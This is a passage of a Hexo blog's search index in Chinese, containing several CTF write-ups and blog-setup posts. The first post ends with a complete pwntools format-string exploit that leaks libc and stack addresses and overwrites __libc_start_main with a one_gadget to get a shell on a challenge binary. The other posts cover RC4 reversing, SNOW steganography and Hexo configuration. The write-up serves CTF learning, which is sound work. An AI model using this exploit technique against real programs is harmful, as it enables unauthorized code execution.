-&gt; 目标地址</strong>，这样的格式。</font></p><p><strong>因为修改a其实是修改c</strong></p><p>举个例子：</p><p><font color="red"> 为了得到A -&gt; B -&gt; C    C不在栈上</font></p><p><font color="red"> 有一个D跟C的地址很像，或许就末两字节不相同</font></p><p><font color="red">借助A -&gt; B -&gt; D 且已知偏移的情况下</font></p><p><font color="red"> 修改A末两字节，就可以使得B-&gt;C。</font></p><h4 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h4><ul><li>先查看栈结构，找到 a-&gt;b-&gt;c的结构，锁定修改的目标：</li></ul><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825183747991.bmp"></p><p>如图，为了修改__libc_start_main，我们选定的结构是下面画框部分，可以发现画框部分的地址，与libc_start_main前面的地址相差不大，我们就成功地找到了”朋友”</p><p><font color="red"> D - &gt; __libc_start_main</font></p><p><font color="red"> A -&gt; B -&gt; C ，修改C为D</font></p><p><font color="red"> A -&gt; B -&gt; D -&gt; __libc_start_main ,再修改B就可以达到修改libc_start_main了</font></p><ul><li>接下来对B而言，刚好也是一个a-&gt;b-&gt;c的结构，<font color="red"><strong>B-&gt;D-&gt;libc_start_main</strong>,如此我们修改B即修改第三个指针libc_start_main为onegadget即可getshell</font></li></ul><p><img src="/2024/08/25/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/capture_20240825184307134.bmp"></p><h4 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher3 <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;node8.anna.nssctf.cn&quot;,28175)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/hgfs/ctfpwn/exp/libc/libc6_2.31-0ubuntu9.10_amd64.so&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 泄露libc基地址和一个stack地址</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%9$p%11$p&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_start_main= <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] libc_start_main:&quot;</span>,<span class="built_in">hex</span>(libc_start_main))</span><br><span class="line"><span class="comment">#libc = LibcSearcher(&#x27;__libc_start_main&#x27;,libc_start_main)</span></span><br><span class="line">base = libc_start_main - libc.sym[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">stack=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack = &quot;</span>, <span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">stack1 = stack - <span class="number">240</span> <span class="comment"># stack1 -&gt; libc_start_main</span></span><br><span class="line">stack2 = stack - <span class="number">224</span> <span class="comment"># stack2 -&gt; stack</span></span><br><span class="line">one = base + <span class="number">0xe3b01</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack1 = &quot;</span>, <span class="built_in">hex</span>(stack1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+][+][+][+] stack2 = &quot;</span>, <span class="built_in">hex</span>(stack2))</span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>) </span><br><span class="line">p.sendline(pay)</span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line"></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">16</span>&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">stack1+=<span class="number">2</span></span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(stack1&amp;<span class="number">0xffff</span>).encode()+<span class="string">b&#x27;c%11$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack2+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"> </span><br><span class="line">pay=(<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(one&gt;&gt;<span class="number">32</span>).encode()+<span class="string">b&#x27;c%39$hn&#x27;</span>).ljust(<span class="number">0x98</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(stack+<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;&gt;\n&#x27;</span>)</span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#bug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>libc版本是泄露libc_start_main后上网站找的：<a href="https://libc.rip/">libc-database</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>exe-&gt;pyc &amp;&amp; RC4</title>
      <link href="/2024/08/22/exe-pyc-RC4/"/>
      <url>/2024/08/22/exe-pyc-RC4/</url>
      
        <content type="html"><![CDATA[<hr><h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><p>这篇文章主要介绍ctfre部分，从exe文件转化成pyc文件，顺便提一下rc4加密。</p><p>题目来自basectf,如果选手看到了请务必避开。</p><h1 id="转化"><a href="#转化" class="headerlink" title="转化"></a>转化</h1><h2 id="exe-pyc"><a href="#exe-pyc" class="headerlink" title="exe-&gt;pyc"></a>exe-&gt;pyc</h2><ul><li><p>首先明白为什么要从exe-&gt;pyc，见下图：</p><p><img src="/2024/08/22/exe-pyc-RC4/exe%E4%BE%8B%E5%AD%90.bmp" alt="exe例子"></p></li></ul><p>我们发现图片虽然是一个exe,但是程序图标是可以发现是一个.py文件，于是我们要去转化成pyc</p><p><strong>介绍一篇文章看看</strong>：<a href="https://blog.csdn.net/qq_35578171/article/details/138047494?app_version=6.4.5&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22138047494%22,%22source%22:%222302_79260400%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">csdn-blog</a></p><p>觉得麻烦提供一个在线网站：<a href="https://pyinstxtractor-web.netlify.app/">PyInstaller Extractor WEB (pyinstxtractor-web.netlify.app)</a></p><p>自己选择exe文件运行就行，会得到一个压缩包，里面会有pyc文件</p><p><img src="/2024/08/22/exe-pyc-RC4/exe-pyc.bmp"></p><h2 id="pyc-py代码："><a href="#pyc-py代码：" class="headerlink" title="pyc-&gt;py代码："></a>pyc-&gt;py代码：</h2><ul><li><p>先了解什么是pyc：我们所看到的pyc文件，其实是PyCodeObject，是Python编译后的结果。当python程序运行时，编译的结果是保存于PyCodeObject，程序运行结束后，Python就将PyCodeObject写入到pyc文件中，这是个字节码文件。[<a href="https://blog.csdn.net/weixin_42183408/article/details/88557812">引用</a>]</p></li><li><p>在线网站：<a href="https://www.lddgo.net/string/pyc-compile-decompile">在线Python pyc文件编译与反编译 (lddgo.net)</a></p></li></ul><h1 id="RC4"><a href="#RC4" class="headerlink" title="RC4"></a>RC4</h1><ul><li><p>先前得到的pyc转化为py代码，我们可以发现如下的加密脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Visit https://www.lddgo.net/string/pyc-compile-decompile for more information</span></span><br><span class="line"><span class="comment"># Version : Python 3.9</span></span><br><span class="line"><span class="keyword">import</span> Key</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_Sbox</span>(<span class="params">seed</span>):</span><br><span class="line">    k_b = (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ <span class="built_in">ord</span>(seed[i % <span class="built_in">len</span>(seed)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + k_b[i]) % <span class="number">256</span></span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KeyStream</span>(<span class="params">text, Sbox</span>):</span><br><span class="line">    s = Sbox.copy()</span><br><span class="line">    (i, j) = (<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    k = [<span class="number">0</span>] * <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i] = s[j]</span><br><span class="line">        s[j] = s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        k[r] = s[t] ^ Key.keykey[r % <span class="built_in">len</span>(Key.keykey)]</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">text, seed</span>):</span><br><span class="line">    Sbox = init_Sbox(seed)</span><br><span class="line">    key = KeyStream(text, Sbox)</span><br><span class="line">    enc = (<span class="keyword">lambda</span> <span class="number">.0</span> = <span class="literal">None</span>: [ text[i] ^ key[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(<span class="built_in">range</span>(<span class="built_in">len</span>(text)))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(enc)</span><br><span class="line"></span><br><span class="line">enc = <span class="string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span></span><br><span class="line">flag = <span class="built_in">input</span>(<span class="string">&#x27;Please input Your flag:&#x27;</span>)</span><br><span class="line">flag = (<span class="keyword">lambda</span> <span class="number">.0</span>: [ <span class="built_in">ord</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">.0</span> ])(flag)</span><br><span class="line">flag = Encrypt(flag, Key.key)</span><br><span class="line"><span class="keyword">if</span> flag != enc:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;It&#x27;s not flag!&quot;</span>)</span><br><span class="line">    <span class="keyword">continue</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;You are right!&#x27;</span>)</span><br><span class="line">sys.exit(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">key = &#x27;yOU_f1nd_m3&#x27;</span></span><br><span class="line"><span class="string">keykey = [66,97,115,101]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>这就是很明显的RC4加密了，256次循环初始化Sbox,目的就是为了打乱数字顺序，顺序依靠key，然后再通过异或获得flag。</p><ul><li>解密脚本（仅针对本题，因为此题有两个key）</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given key and keykey</span></span><br><span class="line">key = <span class="string">&#x27;yOU_f1nd_m3&#x27;</span></span><br><span class="line">keykey = [<span class="number">66</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">101</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init_Sbox</span>(<span class="params">seed</span>):</span><br><span class="line">    k_b = [<span class="built_in">ord</span>(seed[i % <span class="built_in">len</span>(seed)]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]</span><br><span class="line">    s = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s[i] + k_b[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">KeyStream</span>(<span class="params">text, Sbox</span>):</span><br><span class="line">    s = Sbox.copy()</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    k = [<span class="number">0</span>] * <span class="built_in">len</span>(text)</span><br><span class="line">    <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(text)):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + s[i]) % <span class="number">256</span></span><br><span class="line">        s[i], s[j] = s[j], s[i]</span><br><span class="line">        t = (s[i] + s[j]) % <span class="number">256</span></span><br><span class="line">        k[r] = s[t] ^ keykey[r % <span class="built_in">len</span>(keykey)]</span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">enc, seed</span>):</span><br><span class="line">    Sbox = init_Sbox(seed)</span><br><span class="line">    key_stream = KeyStream(enc, Sbox)</span><br><span class="line">    decrypted = [enc[i] ^ key_stream[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc))]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> decrypted)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given encrypted message</span></span><br><span class="line">enc = <span class="string">b&#x27;\xe6\xaeC~F\xf2\xe3\xbb\xac\x9a-\x02U\x85p\xeb\x19\xd1\xe4\xc93sG\xb0\xeb1\xb5\x05\x05\xc3\xd7\x00\x18+D\xbc\x0cO\x9em\xf1\xbd&#x27;</span></span><br><span class="line">flag = Decrypt(enc, key)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="通用解密脚本"><a href="#通用解密脚本" class="headerlink" title="通用解密脚本"></a>通用解密脚本</h2><p>参考：<a href="https://www.jianshu.com/p/d9ad5fc524ec">Python3.7实现RC4加密解密（超详细） - 简书 (jianshu.com)</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_main</span>(<span class="params">key = <span class="string">&quot;init_key&quot;</span>, message = <span class="string">&quot;init_message&quot;</span></span>):</span><br><span class="line">    <span class="comment"># print(&quot;RC4解密主函数调用成功&quot;)</span></span><br><span class="line">    s_box = rc4_init_sbox(key)</span><br><span class="line">    crypt = rc4_excrypt(message, s_box)</span><br><span class="line">    <span class="keyword">return</span> crypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_init_sbox</span>(<span class="params">key</span>):</span><br><span class="line">    s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))  <span class="comment"># 我这里没管秘钥小于256的情况，小于256不断重复填充即可</span></span><br><span class="line">    <span class="comment"># print(&quot;原来的 s 盒：%s&quot; % s_box)</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">        s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">    <span class="comment"># print(&quot;混乱后的 s 盒：%s&quot;% s_box)</span></span><br><span class="line">    <span class="keyword">return</span> s_box</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_excrypt</span>(<span class="params">plain, box</span>):</span><br><span class="line">    <span class="comment"># print(&quot;调用解密程序成功。&quot;)</span></span><br><span class="line">    plain = base64.b64decode(plain.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    plain = <span class="built_in">bytes</span>.decode(plain)</span><br><span class="line">    res = []</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> plain:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + box[i]) % <span class="number">256</span></span><br><span class="line">        box[i], box[j] = box[j], box[i]</span><br><span class="line">        t = (box[i] + box[j]) % <span class="number">256</span></span><br><span class="line">        k = box[t]</span><br><span class="line">        res.append(<span class="built_in">chr</span>(<span class="built_in">ord</span>(s) ^ k))</span><br><span class="line">    <span class="comment"># print(&quot;res用于解密字符串，解密后是：%res&quot; %res)</span></span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span>.join(res)</span><br><span class="line">    <span class="comment"># print(&quot;解密后的字符串是：%s&quot; %cipher)</span></span><br><span class="line">    <span class="comment"># print(&quot;解密后的输出(没经过任何编码):&quot;)</span></span><br><span class="line">    <span class="keyword">return</span>  cipher</span><br><span class="line"><span class="comment"># rc4_main(&quot;123456sh&quot;, &quot;ABHCum92PMOXwqI=&quot;)</span></span><br></pre></td></tr></table></figure><p>加解密其实没太大区别，可以上网搜搜</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Crypto-特殊加密</title>
      <link href="/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/"/>
      <url>/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="SNOW-雪"><a href="#SNOW-雪" class="headerlink" title="SNOW(雪)"></a>SNOW(雪)</h1><ul><li>关于一种txt空白加密的方法：</li></ul><p><img src="/2024/08/22/Crypto-%E7%89%B9%E6%AE%8A%E5%8A%A0%E5%AF%86/%E6%A0%B7%E4%BE%8B.bmp" alt="样例"></p><p>像这样子的，txt文件用winHex打开，发现文字后面大片的空白，猜测是SNOW加密。</p><ul><li><p>工具下载地址：<a href="https://darkside.com.au/snow/">The SNOW Home Page (darkside.com.au)</a></p></li><li><p>使用：将要解密的txt放在同一目录下，还需要知道key，然后利用指令解密：</p><p><code>.\SNOW.EXE -p key -C .\flag.txt</code>   [解密]</p><p><code>.\SNOW.EXE -C -m &quot;message&quot; -p &quot;key&quot; infile outfile</code> [加密]</p><p>加密表示将隐藏文件infile中的message用key加密，储存在outfile中</p></li><li><p>详细的可参考：<a href="https://blog.csdn.net/qq_53079406/article/details/123810053">csdn-blog</a></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记录解决hexo插图失败</title>
      <link href="/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/"/>
      <url>/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><ul><li>根据网上教学搭建博客，想要插入<strong>本地图片</strong>，但是图片始终无法加载出来：</li></ul><p><img src="/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/%E5%A4%B1%E8%B4%A5%E6%A0%B7%E4%BE%8B.bmp" alt="失败样例"></p><p>类似于上面的情况，或者就一个小图案，无法加载出来。</p><h1 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h1><ul><li><p>按照网上说的，先修改Blog目录下的_config.yml中的<strong>post_asset_folde改为true</strong>,这个必须先该</p></li><li><p>下载插件：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">npm install <span class="attr">https</span>:<span class="comment">//github.com/CodeFalling/hexo-asset-image --save</span></span><br></pre></td></tr></table></figure></li><li><p>修改Typora的图像偏好：<br><img src="/2024/08/21/%E8%AE%B0%E5%BD%95%E8%A7%A3%E5%86%B3hexo%E6%8F%92%E5%9B%BE%E7%89%87%E5%A4%B1%E8%B4%A5/%E5%81%8F%E5%A5%BD%E8%AE%BE%E7%BD%AE.bmp" alt="偏好设置"></p></li></ul><p>像这样设置好，这样你在每一次hexo new XXX的时候，<strong>都会在_posts下面生成一个和.md同名的文件夹，这个文件夹就会专门来放你的图片</strong>，我们也可以，提前将图片放进去。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul><li>关于其他的插入图片方式，比如建立图床&lt;！<a href="url"></a>&gt;来引用图片，个人感觉还是比较复杂，就没有实现了，以后有时间再尝试。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 搭建博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="代码测试："><a href="#代码测试：" class="headerlink" title="代码测试："></a>代码测试：</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="图片测试："><a href="#图片测试：" class="headerlink" title="图片测试："></a>图片测试：</h2><p><img src="/2024/08/20/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/ceshi.jpg" alt="ceshi"></p><h2 id="引用测试"><a href="#引用测试" class="headerlink" title="引用测试"></a>引用测试</h2><blockquote><p>你好,这是一条引用</p></blockquote><h2 id="链接测试"><a href="#链接测试" class="headerlink" title="链接测试"></a>链接测试</h2><ul><li>这是fastbin_attack文章链接<br> &lt;<a href="https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#">https://www.yuque.com/yuqueyonghupiiwso/gixo00/pdl4hxuh2ub4g3vd?singleDoc#</a> &gt;</li></ul><h2 id="无序列表测试"><a href="#无序列表测试" class="headerlink" title="无序列表测试"></a>无序列表测试</h2><ul><li>小向</li><li>小罗</li><li>大向</li></ul><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h4 id="四级标题"><a href="#四级标题" class="headerlink" title="四级标题"></a>四级标题</h4>]]></content>
      
      
      
        <tags>
            
            <tag> 测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/08/20/hello-world/"/>
      <url>/2024/08/20/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
